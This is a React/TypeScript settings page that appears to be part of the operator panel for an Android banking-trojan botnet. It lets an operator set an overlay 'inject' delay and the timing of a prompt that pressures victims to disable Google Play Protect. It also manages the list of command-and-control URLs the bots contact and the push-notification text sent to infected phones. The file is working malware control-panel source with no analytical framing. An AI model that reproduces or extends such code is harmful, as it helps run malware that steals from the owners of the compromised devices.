import { Card, Row, Col, Slider, Select, Form, Input, Button, notification } from 'antd';
import {
  MinusCircleOutlined
} from '@ant-design/icons';
import { useEffect, useRef, useState } from 'react';
import { GlobalSettingStateType, ServerResponseType } from '../../common/DataType';
import { getGlobalSetting, setGlobalSetting } from './services';
import { changeResponseToClient } from '../../common/Utility';

const { Option } = Select

export default () => {

  const [state, setState] = useState<GlobalSettingStateType>({
    botTableTime: '30',
    protectTime: '30',
    injectTime: '30',
    pushText: '',
    pushTitle: '',
    urls: []
  })

  let init = useRef(true)

  useEffect(() => {
    getGlobalSetting().then((params: GlobalSettingStateType) => {
      setState(changeResponseToClient(params))
      init.current = false
    })
  }, [])

  const submit = (key: string, value: any) => {
    let params = {
      ...state,
      [key]: value
    }

    setGlobalSetting(params).then((res: ServerResponseType) => {
      notification.info({
        message: res.type.toUpperCase(),
        description: res.message
      })
    })

  }

  const submitLink = (links: any) => {
    let url: string[] = links.links.map((link: any) => link.link)

    setState((state: any) => {
      return {
        ...state,
        url: url
      }
    })

    submit('urls', url)
  }

  return (
    <>
      <Row gutter={16}>
        <Col className="gutter-row" span={8}>
          <Card size="small" title="Table settings" className='h-56 !rounded-xl hover:!shadow-red-600 shadow-md duration-300'>
            <h3 className='text-stone-400'>Select auto update delay</h3>
            <Slider className='!mb-8' value={parseInt(state.botTableTime)} onChange={(v: number) => { setState((state: GlobalSettingStateType) => ({ ...state, botTableTime: v.toString() })); submit('botTableTime', v.toString()) }} tipFormatter={(value: number | undefined) => `${value} s`} />
            <small className='text-stone-500'>This is used only to automatically update the bots table.</small>
          </Card>
        </Col>
        <Col className="gutter-row" span={8}>
          <Card size="small" title="Bot time global settings" className='h-56 !rounded-xl hover:!shadow-red-600 shadow-md duration-300'>
            <h3 className='text-stone-400'>Time inject delay</h3>
            <Select className='w-full !mb-4' defaultValue={state.injectTime.toString()} value={state.injectTime.toString()} onChange={(v: string) => { setState((state: GlobalSettingStateType) => ({ ...state, injectTime: v })); submit('injectTime', v.toString()) }}>
              <Option value="0">Off</Option>
              <Option value="10">10 sec</Option>
              <Option value="20">20 sec</Option>
              <Option value="30">30 sec</Option>
              <Option value="40">40 sec</Option>
              <Option value="50">50 sec</Option>
              <Option value="60">60 sec</Option>
            </Select>
            <small className='text-stone-500'>This is used only to automatically update the bots table.</small>
          </Card>
        </Col>
        <Col className="gutter-row" span={8}>
          <Card size="small" title="Play Protect off time" className='h-56 !rounded-xl hover:!shadow-red-600 shadow-md duration-300'>
            <h3 className='text-stone-400'>PlayProtect time</h3>
            <Select className='w-full !mb-4' defaultValue={state.protectTime.toString()} value={state.protectTime.toString()} onChange={(v: string) => { setState((state: GlobalSettingStateType) => ({ ...state, protectTime: v })); submit('protectTime', v.toString()) }}>
              <Option value="0">Disable</Option>
              <Option value="10">10 sec</Option>
              <Option value="20">20 sec</Option>
              <Option value="30">30 sec</Option>
              <Option value="40">40 sec</Option>
              <Option value="50">50 sec</Option>
            </Select>
            <small className='text-stone-500'>The time after which the window will be displayed with a request to disable Play Protect.</small>
          </Card>
        </Col>
      </Row>
      <Row gutter={16} className='mt-4'>
        <Col className='gutter-row' span={16}>
          <Card size="small" title="Links to communicate with the bot" className='min-h-[240px] !rounded-xl hover:!shadow-red-600 shadow-md duration-300'>
            <Form name="dynamic_form_nest_item" onFinish={submitLink} autoComplete="off">
              {
                !init.current ? (
                  <Form.List name="links" initialValue={state.urls.map((url: string) => ({ link: url }))}>
                    {(fields, { add, remove }) => (
                      <>
                        {fields.map(({ key, name, ...restField }) => (
                          <Form.Item key={key} className='!mb-1'>
                            <Form.Item
                              {...restField}
                              name={[name, 'link']}
                              className='!mb-1 !w-100'
                            >
                              <Input
                                placeholder="Write link"
                                suffix={<MinusCircleOutlined onClick={() => remove(name)} />}
                              />
                            </Form.Item>
                          </Form.Item>
                        ))}
                        <Form.Item className='!mb-2'>
                          <Button type="dashed" onClick={() => add()} block >
                            Add field
                          </Button>
                        </Form.Item>
                      </>
                    )}
                  </Form.List>
                ) : (
                  ""
                )
              }
              <Form.Item className='!mb-2 float-right'>
                <Button type="primary" htmlType="submit" ghost>
                  Submit
                </Button>
              </Form.Item>
            </Form>
          </Card>
        </Col>
        <Col className="gutter-row" span={8}>
          <Card size="small" title="Push settings" className='h-60 !rounded-xl hover:!shadow-red-600 shadow-md duration-300'>
            <Form
              name="basic"
              layout="vertical"
              initialValues={{ remember: true }}
              autoComplete="off"
            >
              <Form.Item
                className='!mb-2'
                label="Push title"
              >
                <Input placeholder='Enter push title' value={state.pushTitle} onChange={(e: any) => { setState((state: GlobalSettingStateType) => ({ ...state, pushTitle: e.target.value })); submit('pushTitle', e.target.value) }} />
              </Form.Item>
              <Form.Item
                className='!mb-2'
                label="Push text"
              >
                <Input placeholder='Enter push text' value={state.pushText} onChange={(e: any) => { setState((state: GlobalSettingStateType) => ({ ...state, pushText: e.target.value })); submit('pushText', e.target.value) }} />
              </Form.Item>
            </Form>
          </Card>
        </Col>
      </Row>
    </>
  )
}